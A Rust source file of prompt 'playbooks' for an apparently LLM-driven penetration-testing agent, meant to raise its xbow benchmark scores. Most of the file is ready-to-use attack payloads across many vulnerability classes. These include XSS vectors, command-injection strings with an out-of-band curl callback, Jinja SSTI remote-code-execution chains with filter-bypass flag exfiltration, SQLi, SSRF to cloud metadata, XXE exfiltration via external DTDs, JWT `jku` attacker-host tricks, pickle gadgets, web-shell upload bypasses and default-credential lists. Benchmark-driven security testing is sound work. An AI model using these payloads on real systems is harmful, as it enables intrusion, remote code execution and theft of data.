//! Per-vuln-class playbook prompts.
//!
//! The chat surface routes flat operator requests ("scan x.com",
//! "find XSS in y") into the LLM with a generic system prompt.
//! That works fine for IDOR / default-creds / JWT — Mantis already
//! solves those at 27-40% on xbow-benchmarks — but completely
//! fails on classes like XSS (0/23), command_injection (0/11),
//! and SSTI (1/13) because the model doesn't know:
//!
//!   - which payload families the class actually requires
//!   - what false-negatives to watch out for
//!   - when OOB callbacks are necessary
//!   - how to verify a hit deterministically
//!
//! Each playbook below is a focused prompt fragment that the chat
//! surface appends to the system prompt when the operator mentions
//! the class. They're tight (~80-150 words each) so they fit
//! inside Anthropic's cache window, and they're additive — the
//! generic "you are Mantis" prompt still applies.

use std::collections::BTreeMap;

/// One playbook entry. `tags` is the set of xbow-benchmarks tags
/// (or operator phrases) that should trigger this playbook.
#[derive(Debug, Clone)]
pub struct Playbook {
    pub tags: &'static [&'static str],
    pub label: &'static str,
    pub body: &'static str,
}

/// Shared prefix appended to every blind-class playbook. Reminds
/// the model that the `mantis_oob_listener` MCP tool exists and
/// must be started BEFORE any payloads are sent.
const OOB_DIRECTIVE: &str = "\n\nOOB SETUP (do this FIRST for any blind variant of this class): \
call `mantis_oob_listener` to start an interactsh session, grab the \
`url` from the response, then embed that URL in every payload. A \
callback arriving at the listener IS the flag-equivalent — no in-band \
signal needed. Without OOB, blind variants of this class are \
undetectable; the historic 0% on these classes is mostly an OOB gap.";

/// The full catalogue. Add new entries here as benchmark coverage
/// expands. Each entry should be:
///   1. concrete (payloads / endpoints / responses, not theory),
///   2. focused (one class, not "OWASP top 10"),
///   3. verifiable (state what a hit looks like).
pub const PLAYBOOKS: &[Playbook] = &[
    Playbook {
        tags: &["xss", "reflected_xss", "stored_xss", "dom_xss"],
        label: "XSS",
        body: "XSS playbook. Mantis currently solves 0/23 XSS benchmarks — the model usually \
               stops at one payload and declares 'no XSS'. Don't.\n\n\
               Try ALL of:\n\
               - Plain reflection: `<svg onload=alert(1)>` in every parameter\n\
               - Attribute breakout: `\" onmouseover=alert(1) x=\"`\n\
               - Script context: `'-alert(1)-'` and `</script><svg/onload=alert(1)>`\n\
               - DOM sinks: probe `location.hash`, `document.referrer`, `window.name`\n\
               - Filter bypass: `<svG OnLoAd=alert(1)>`, HTML-entity (`&#x3c;`), case-mixed tags\n\
               - CSP-friendly: `<base href=//evil.example>`, `<meta http-equiv=refresh ...>`\n\n\
               Verify with `interactsh` callbacks (`<img src=//<id>.oast.fun/x>`) OR a literal \
               `alert(1)` confirmation in the rendered HTML. The flag is usually behind an \
               authenticated reflective context — solve auth first, then test EVERY input in the \
               authed surface. Don't skip the search box, the form-error message, or the 404 page.",
    },
    Playbook {
        tags: &["command_injection", "cmdi", "os_command_injection"],
        label: "Command Injection",
        body: "Command injection playbook. 0/11 solved — usually because the operator probes only \
               in-band reflection. Most modern apps swallow stdout.\n\n\
               Payload families (try in this order):\n\
               1. In-band: `;id`, `|id`, `&&id`, `` `id` ``, `$(id)`, `;sleep 5`\n\
               2. Newline injection: `\\nid\\n`, `%0aid%0a`\n\
               3. Time-based blind: `;sleep 10`, observe response delay\n\
               4. OOB: `;curl http://<interactsh>/x;` — REQUIRED when the app returns 200 \
                  regardless of payload\n\
               5. Argument injection: param like `--exec=`, `-e`, `-c` for binaries that \
                  accept flags\n\n\
               Sinks to probe FIRST: filename inputs, `ping <host>` forms, `convert` / \
               `imagemagick` upload paths, anything labeled 'diagnostics' / 'health' / 'tools'. \
               Verify with `interactsh` OR a deterministic side-effect (file written, response \
               delay > 5s, unique echo string).",
    },
    Playbook {
        tags: &["ssti", "template_injection", "server_side_template_injection"],
        label: "SSTI",
        body: "SSTI playbook. Live xbow partial: 7/8 addressable solved; the remaining miss is \
               an encoded/stored Jinja surface after default-login or Flask session handling. \
               Do not stop at visible calculator parameters.\n\n\
               Step 1 — fingerprint the engine:\n\
               - `${7*7}` → 49 ⇒ Freemarker / Mako / Velocity\n\
               - `{{7*7}}` → 49 ⇒ Jinja2 / Twig / Liquid / Nunjucks\n\
               - `<%= 7*7 %>` → 49 ⇒ ERB / EJS\n\
               - `#{7*7}` → 49 ⇒ Ruby string interpolation\n\
               - `@(7*7)` → 49 ⇒ Razor (.NET)\n\n\
               Step 2 — escalate per engine:\n\
               - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`\n\
               - Twig: `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`\n\
               - Freemarker: `<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}`\n\
               - ERB: `<%= `id` %>`\n\n\
               Step 3 — when filters block `{}`, `_`, `.`, or `[]`:\n\
               - Retry encoded braces: `%7B%7B7*7%7D%7D`, double-encoded `%257B%257B7*7%257D%257D`, \
                 and unicode escapes if the app decodes before rendering.\n\
               - If `{{...}}` is blocked but `{%...%}` is allowed, Jinja statement output still works: \
                 `{% print 7*7 %}`. For Flask/Jinja attribute traversal without raw `_`, `.`, or `[]`, \
                 use `attr('\\x5f\\x5fclass\\x5f\\x5f')`, `attr('\\x5f\\x5finit\\x5f\\x5f')`, \
                 `attr('\\x5f\\x5fglobals\\x5f\\x5f')`, and `attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')`.\n\
               - If the rendered value must match a numeric regex like `[0-9.]*`, do not print `id` \
                 or `FLAG{...}` directly. Print fixed-width decimal bytes from `/flag` with a Jinja-only \
                 statement payload that contains no raw `_`, `.`, or `[]`, e.g. \
                 `{% set b=config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f') %}{% set f=b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('open')('/flag')|attr('read')() %}{% for c in f %}{% print '%03d'|format(b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('ord')(c)) %}{% endfor %}`. \
                 Extract `loan_principal`, then locally decode 3-digit chunks back to `FLAG{...}` before reporting/submitting.\n\
               - Test stored fields rendered later: profile name, address, notes, loan purpose, \
                 comments, and admin-visible pages. A rejected calculator field does not clear \
                 stored profile SSTI.\n\
               - Flask/Jinja targets: mine or default the SECRET_KEY, forge a session only to \
                 reach authed templates, then test every reflected/stored field with curl/form \
                 POSTs that set a correct Content-Length.\n\n\
               Verify with deterministic output (`id` returns `uid=...`) OR interactsh callback. \
               Probe error pages — SSTI in stack traces is common in dev mode.",
    },
    Playbook {
        tags: &["sqli", "sql_injection", "blind_sqli", "time_based_sqli"],
        label: "SQL Injection",
        body: "SQLi playbook. 1/6 + 0/3 (blind) solved.\n\n\
               Order of operations:\n\
               1. Quote-break: append `'` to every parameter. If response changes (500, empty, \
                  redirect), DB is in the loop.\n\
               2. Boolean diff: `' OR 1=1--` vs `' OR 1=2--`. Different responses = injectable.\n\
               3. UNION-based: `' UNION SELECT NULL,NULL,...--` (increment columns until no \
                  error). Replace NULLs with `version()`, `current_user`, etc.\n\
               4. Error-based: `'AND(SELECT 1/0 FROM dual)--`. Stack trace gives schema.\n\
               5. Time-based blind: `';SELECT pg_sleep(5)--` (Postgres), `' AND SLEEP(5)--` \
                  (MySQL), `';WAITFOR DELAY '0:0:5'--` (MSSQL).\n\
               6. OOB (when blind + no time-control): MySQL `LOAD_FILE('//attacker/x')` or \
                  MSSQL `xp_dirtree '//attacker/x'`.\n\n\
               Common false-negative: WAF strips `OR 1=1` but accepts `OR 'a'='a'` or \
               `OR 0x31=0x31`. Always retry with encoding variants if the first probe fails.",
    },
    Playbook {
        tags: &["ssrf", "server_side_request_forgery"],
        label: "SSRF",
        body: "SSRF playbook. 0/3 solved — all attempts stopped at in-band signal.\n\n\
               Probe types (run all):\n\
               - Direct fetch: `http://169.254.169.254/latest/meta-data/` (AWS), \
                 `http://metadata.google.internal/computeMetadata/v1/` (GCP)\n\
               - Localhost: `http://127.0.0.1:80/`, `http://[::1]:80/`, `http://0.0.0.0/`\n\
               - DNS rebinding workaround: `http://localtest.me/`, `http://spoofed.burpcollaborator.net/`\n\
               - Schema confusion: `file:///etc/passwd`, `gopher://127.0.0.1:6379/`, `dict://`\n\
               - Bypass tricks: URL-encoding (`%6C%6F%63%61%6C%68%6F%73%74`), decimal IP \
                 (`http://2130706433/` = 127.0.0.1), `localhost.example.com`\n\n\
               When blind (no response body), use interactsh as the canary. Most SSRF in real \
               apps is in URL-fetcher endpoints: image proxies, webhook setters, OG-tag \
               previewers, RSS feed importers, PDF render-from-URL services.",
    },
    Playbook {
        tags: &["xxe", "xml_external_entity"],
        label: "XXE",
        body: "XXE playbook. 0/3 solved.\n\n\
               Start with in-band entity expansion:\n\
               `<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>`\n\
               `<root>&xxe;</root>`\n\n\
               If the response strips the entity body (most production parsers do), switch to \
               OOB:\n\
               `<!ENTITY % ext SYSTEM \"http://<interactsh>/x.dtd\">` → trigger %ext;\n\
               where `x.dtd` defines an out-of-band exfil chain.\n\n\
               Hit every endpoint that accepts XML — `Content-Type: application/xml`, SOAP \
               actions, SAML responses, RSS importers, sitemap uploaders. SVG file uploads are \
               another common XXE sink (SVG is XML). DOCX/XLSX uploads too (they're XML inside \
               ZIP).",
    },
    Playbook {
        tags: &["lfi", "path_traversal", "directory_traversal"],
        label: "LFI / Path Traversal",
        body: "LFI / path traversal playbook. 1/6 solved.\n\n\
               Payload ladder:\n\
               1. Plain: `../../etc/passwd`, `..\\..\\..\\windows\\win.ini`\n\
               2. URL-encoded: `..%2f..%2fetc%2fpasswd`, `..%c0%af..%c0%afetc%c0%afpasswd`\n\
               3. Double-encoded: `..%252f..%252fetc%252fpasswd`\n\
               4. Null byte (legacy PHP): `../etc/passwd%00`\n\
               5. Filter bypass: `....//....//etc/passwd`, `..%5c..%5cetc%5cpasswd`\n\
               6. PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`, \
                  `expect://id`, `data://text/plain,<?php phpinfo();?>`\n\n\
               Test EVERY parameter that takes a filename: `?file=`, `?include=`, `?lang=`, \
               `?template=`, even avatar / profile-pic upload paths. Verify with `/etc/passwd` \
               (linux) or `/windows/win.ini` (Windows) — both have well-known content.",
    },
    Playbook {
        tags: &["idor", "insecure_direct_object_reference"],
        label: "IDOR",
        body: "IDOR playbook. 6/15 solved already — the most reliable class for Mantis.\n\n\
               Reinforcement: every numeric/UUID path segment or query param after `id=`, \
               `uid=`, `user=`, `order=`, `account=` is an IDOR candidate.\n\n\
               Required steps:\n\
               1. Identify the resource pattern: `/api/users/42`, `/orders?id=99`, etc.\n\
               2. Acquire TWO accounts (register, or use default creds). Get session tokens for \
                  each.\n\
               3. As user A, list resources you own — record their IDs.\n\
               4. As user A's session, request user B's IDs. Look for 200 + B's data (the hit).\n\
               5. Vary the HTTP verb — GET might be blocked but PUT/DELETE often isn't.\n\
               6. Try the API directly even if the UI shows a 403 — the backend often forgets.\n\n\
               If only ONE account exists, sequential ID probing (e.g. `/orders/1`, `/orders/2`, \
               ...) often hits admin-created records.",
    },
    Playbook {
        tags: &["default_credentials", "weak_credentials", "default_creds"],
        label: "Default Credentials",
        body: "Default-creds playbook. Live xbow partial: 10/14 addressable solved; remaining \
               misses usually skip username discovery or try only `admin/admin`.\n\n\
               Required order:\n\
               1. Inventory every auth surface first: `/login`, `/admin`, `/manager/html`, \
                  `/jenkins`, `/grafana`, `/wp-admin`, `/phpmyadmin`, Swagger/OpenAPI auth, \
                  HTTP Basic realms, SSH banners, and API token endpoints.\n\
               2. Mine usernames from HTML comments, robots.txt, JS bundles, error messages, \
                  registration validation, seed data, `/users`, `/api/users`, and docs pages.\n\
               3. For each discovered username, try username=password and `<username>123` before \
                  the generic list.\n\
               4. Service defaults: admin/admin, admin/password, admin/changeme, admin/admin123, \
                  root/root, root/toor, guest/guest, demo/demo, test/test, jenkins/jenkins, \
                  tomcat/tomcat, manager/manager, grafana admin/admin, elastic/changeme, \
                  postgres/postgres, mysql/mysql, sa/(empty), oracle/oracle.\n\
               5. If login fails, try password reset, first-run setup pages, default API keys, \
                  and direct admin endpoints with Basic Auth. Respect lockouts: rotate slowly \
                  and stop after deterministic success.",
    },
    Playbook {
        tags: &["jwt", "json_web_token"],
        label: "JWT",
        body: "JWT playbook. 1/3 solved.\n\n\
               Attack ladder:\n\
               1. `alg: none` — strip signature, set `\"alg\":\"none\"` in header, retry\n\
               2. `alg` confusion — RS256 → HS256 with the server's public key as the HMAC \
                  secret (find pubkey via `/jwks.json`, `/.well-known/openid-configuration`)\n\
               3. Weak secret brute — try `secret`, `password`, `key`, `jwt`, the app name, the \
                  domain. `hashcat -m 16500` with rockyou.txt finds most CTF secrets in seconds.\n\
               4. `kid` traversal — `\"kid\":\"../../etc/passwd\"` if the verifier reads kid as a file path\n\
               5. Header injection — `\"jku\":\"http://attacker/jwks.json\"` (server fetches \
                  attacker-controlled keys)\n\
               6. Replay across users — JWT for user A used as user B (server doesn't bind to \
                  session)\n\n\
               Decode every token first (`base64 -d`) — sometimes the flag is literally in the \
               payload (`flag` claim) and Mantis just needs to read it.",
    },
    Playbook {
        tags: &["insecure_deserialization", "deserialization"],
        label: "Insecure Deserialization",
        body: "Deserialization playbook. 1/6 solved.\n\n\
               Identify the format first — `rO0` (Java), `pickle` (Python `__reduce__`), \
               `__PHP_Incomplete_Class` (PHP), `BinaryFormatter` (.NET) etc.\n\n\
               Per-format payload sources:\n\
               - Java: ysoserial gadget chains (`CommonsCollections1`, `Spring1`, etc.)\n\
               - Python pickle: `__reduce__` returning `(os.system, ('id',))` — \
                 `cPickle.loads(base64.b64decode('...'))`\n\
               - PHP: phpggc (PHP-Generic-Gadget-Chains)\n\
               - .NET: ysoserial.net\n\
               - Ruby: erb or marshal gadgets\n\n\
               Find serialized blobs in cookies, hidden form fields, `__VIEWSTATE`, file uploads. \
               Verify with interactsh OR a deterministic side-effect (file write).",
    },
    Playbook {
        tags: &["business_logic", "logic_flaw"],
        label: "Business Logic",
        body: "Business-logic playbook. 0/7 solved — hardest class because the model has to \
               REASON about the app's intent, not pattern-match payloads.\n\n\
               Heuristics that work in practice:\n\
               1. Negative quantities — order `-1` of an item, transfer `-100` dollars.\n\
               2. Integer overflow / int32 wraparound on price * quantity.\n\
               3. Race conditions — fire two concurrent requests against state mutations \
                  (e.g. apply coupon, transfer funds). Use turbo intruder or `xargs -P 50`.\n\
               4. Step skipping — visit `/order/confirm` without `/order/payment`. Often the \
                  backend doesn't enforce step ordering.\n\
               5. Parameter pollution — `coupon=A&coupon=B` may apply both, or override the \
                  validated one.\n\
               6. State confusion — log in as user A in tab 1, user B in tab 2, action in tab 1 \
                  uses tab 2's session.\n\n\
               Slow down. Trace the app's intended state machine on paper, then ask: which edge \
               violates an invariant the dev didn't enforce?",
    },
    Playbook {
        tags: &["arbitrary_file_upload", "file_upload"],
        label: "Arbitrary File Upload",
        body: "File-upload playbook. 0/6 solved.\n\n\
               Bypass ladder:\n\
               1. Extension allowlist bypass — `shell.php.jpg`, `shell.phtml`, `shell.pHp`, \
                  `shell.php5`, `shell.php7`\n\
               2. Content-Type spoof — set header to `image/jpeg`, body is PHP\n\
               3. Magic-bytes spoof — prepend GIF header (`GIF89a`) to PHP content\n\
               4. Null byte — `shell.php\\x00.jpg` (legacy PHP / Apache)\n\
               5. SVG with embedded JS — `<svg><script>alert(1)</script></svg>` for stored XSS\n\
               6. XML in XLSX / DOCX → XXE chain\n\
               7. ZIP-slip — file path with `../../` to write outside upload dir\n\
               8. .htaccess upload — drop `AddType application/x-httpd-php .x` then upload \
                  `shell.x`\n\n\
               After upload, find where it landed. Try `/uploads/<filename>`, `/media/`, \
               `/static/uploads/`. View HTTP response headers — sometimes the URL is in `Location`.",
    },
    Playbook {
        tags: &["privilege_escalation", "horizontal_privesc", "vertical_privesc"],
        label: "Privilege Escalation",
        body: "Priv-esc playbook. 1/14 solved.\n\n\
               Vertical (user → admin):\n\
               1. Force-browse admin URLs even as regular user (`/admin/`, `/api/admin/users`). \
                  Often only the UI hides them.\n\
               2. Edit your own role — `PATCH /api/users/me` with `{\"role\":\"admin\"}`.\n\
               3. Sign-up POST with hidden `role` / `is_admin` param the form doesn't show.\n\
               4. JWT claim injection — see JWT playbook for `alg:none` and signature-strip.\n\
               5. Re-use of admin password reset token (timing or token-prediction issues).\n\n\
               Horizontal (user A → user B):\n\
               1. IDOR — see IDOR playbook.\n\
               2. Mass-assignment — `PATCH /api/users/me` with `{\"id\":<B's id>}`.\n\
               3. OAuth flow tampering — manipulate `state` / `redirect_uri` to land in B's \
                  context.\n\
               4. Session-fixation — set victim's session ID via a controlled link.",
    },
];

/// Look up playbooks matching any of the supplied tags. Match is
/// case-insensitive and substring-friendly so operator phrases
/// like "find some XSS" map to the `xss` playbook even though the
/// exact tag string isn't in the request.
pub fn matching_playbooks(tags: &[String]) -> Vec<&'static Playbook> {
    let mut hits: Vec<&'static Playbook> = Vec::new();
    let mut seen: std::collections::HashSet<&'static str> = std::collections::HashSet::new();
    for raw in tags {
        let needle = raw.to_ascii_lowercase();
        for pb in PLAYBOOKS {
            if seen.contains(pb.label) {
                continue;
            }
            for t in pb.tags {
                if needle.contains(t) {
                    hits.push(pb);
                    seen.insert(pb.label);
                    break;
                }
            }
        }
    }
    hits
}

/// Vuln-class labels for which the OOB directive should be appended
/// to the playbook body. These are the classes where blind variants
/// dominate real-world benchmarks and where Mantis was at or near
/// 0% before the interactsh adapter shipped.
const OOB_CLASSES: &[&str] = &[
    "XSS",
    "Command Injection",
    "SSRF",
    "XXE",
    "SQL Injection",
    "SSTI",
    "Insecure Deserialization",
];

fn playbook_needs_oob(label: &str) -> bool {
    OOB_CLASSES.contains(&label)
}

/// Compose the playbooks for a list of detected tags into a single
/// prompt fragment suitable for appending to the system prompt.
/// Returns an empty string when no playbooks match — the caller can
/// concat unconditionally.
///
/// For blind-prone classes (see `OOB_CLASSES`) the shared
/// [`OOB_DIRECTIVE`] is appended to that playbook's body — reminds
/// the model to spin up `mantis_oob_listener` BEFORE shooting
/// payloads at the target.
pub fn compose_playbook_prompt(tags: &[String]) -> String {
    let pbs = matching_playbooks(tags);
    if pbs.is_empty() {
        return String::new();
    }
    let mut s = String::new();
    s.push_str("\n\nFOCUSED PLAYBOOKS (operator mentioned classes the model historically fails — follow these):\n\n");
    for pb in pbs {
        s.push_str(&format!("### {}\n{}", pb.label, pb.body));
        if playbook_needs_oob(pb.label) {
            s.push_str(OOB_DIRECTIVE);
        }
        s.push_str("\n\n");
    }
    s
}

/// Index playbooks by primary tag — useful for tooling that wants
/// to look up a specific class directly.
pub fn playbook_index() -> BTreeMap<&'static str, &'static Playbook> {
    let mut by_label: BTreeMap<&'static str, &'static Playbook> = BTreeMap::new();
    for pb in PLAYBOOKS {
        by_label.insert(pb.label, pb);
    }
    by_label
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn matching_finds_xss_from_loose_phrase() {
        let tags = vec!["find some reflected_xss please".to_string()];
        let hits = matching_playbooks(&tags);
        assert!(hits.iter().any(|p| p.label == "XSS"));
    }

    #[test]
    fn matching_dedupes_when_two_tags_hit_same_playbook() {
        let tags = vec![
            "xss".to_string(),
            "dom_xss".to_string(),
            "stored_xss".to_string(),
        ];
        let hits = matching_playbooks(&tags);
        let xss_count = hits.iter().filter(|p| p.label == "XSS").count();
        assert_eq!(xss_count, 1, "XSS playbook should only fire once");
    }

    #[test]
    fn compose_returns_empty_when_no_match() {
        let tags = vec!["totally-unrelated-tag-xyz".to_string()];
        assert_eq!(compose_playbook_prompt(&tags), "");
    }

    #[test]
    fn compose_emits_focused_header() {
        let tags = vec!["xss".to_string()];
        let prompt = compose_playbook_prompt(&tags);
        assert!(prompt.contains("FOCUSED PLAYBOOKS"));
        assert!(prompt.contains("### XSS"));
    }

    #[test]
    fn blind_class_playbooks_carry_oob_directive() {
        for label in OOB_CLASSES {
            let pb = PLAYBOOKS
                .iter()
                .find(|p| p.label == *label)
                .unwrap_or_else(|| panic!("OOB_CLASSES references {label} but no playbook exists"));
            let prompt = compose_playbook_prompt(&[pb.tags[0].to_string()]);
            assert!(
                prompt.contains("mantis_oob_listener"),
                "{} playbook should mention mantis_oob_listener in its composed prompt",
                label
            );
            assert!(
                prompt.contains("interactsh"),
                "{} playbook should reference interactsh in its composed prompt",
                label
            );
        }
    }

    #[test]
    fn non_blind_class_playbook_does_not_get_oob_directive() {
        // Default credentials is an in-band class — no OOB needed.
        let prompt = compose_playbook_prompt(&["default_credentials".to_string()]);
        assert!(!prompt.contains("mantis_oob_listener"));
    }

    #[test]
    fn default_creds_playbook_prioritizes_discovery_and_service_defaults() {
        let prompt = compose_playbook_prompt(&["default_credentials".to_string()]);
        assert!(prompt.contains("Inventory every auth surface"));
        assert!(prompt.contains("Mine usernames"));
        assert!(prompt.contains("grafana admin/admin"));
        assert!(prompt.contains("Basic Auth"));
    }

    #[test]
    fn ssti_playbook_covers_encoded_and_stored_jinja_surfaces() {
        let prompt = compose_playbook_prompt(&["ssti".to_string()]);
        assert!(prompt.contains("%7B%7B7*7%7D%7D"));
        assert!(prompt.contains("{% print 7*7 %}"));
        assert!(prompt.contains("attr('\\x5f\\x5fclass\\x5f\\x5f')"));
        assert!(prompt.contains("fixed-width decimal bytes"));
        assert!(prompt.contains("{% set b=config|attr('\\x5f\\x5fclass"));
        assert!(prompt.contains("'%03d'|format"));
        assert!(prompt.contains("3-digit chunks"));
        assert!(prompt.contains("stored fields rendered later"));
        assert!(prompt.contains("Flask/Jinja targets"));
        assert!(prompt.contains("Content-Length"));
    }

    #[test]
    fn every_playbook_has_nonempty_body_and_tags() {
        for pb in PLAYBOOKS {
            assert!(!pb.tags.is_empty(), "{} has no tags", pb.label);
            assert!(!pb.body.is_empty(), "{} has empty body", pb.label);
            assert!(!pb.label.is_empty(), "playbook missing label");
        }
    }

    #[test]
    fn playbook_index_covers_all_entries() {
        let idx = playbook_index();
        assert_eq!(idx.len(), PLAYBOOKS.len());
    }

    #[test]
    fn all_weak_xbow_classes_have_a_playbook() {
        // Hardcoded against the xbow-benchmarks per-class scoreboard:
        // these are the tags where Mantis was at 0% as of the
        // baseline snapshot. If a future test adds a new weak class,
        // surface it here and either add a playbook or document why.
        let must_cover = [
            "xss",
            "command_injection",
            "ssrf",
            "xxe",
            "path_traversal",
            "business_logic",
            "arbitrary_file_upload",
        ];
        let idx = playbook_index();
        let all_tags: Vec<&str> = idx
            .values()
            .flat_map(|pb| pb.tags.iter().copied())
            .collect();
        for needle in must_cover {
            assert!(
                all_tags.iter().any(|t| t.contains(needle)),
                "no playbook covers {needle}"
            );
        }
    }
}
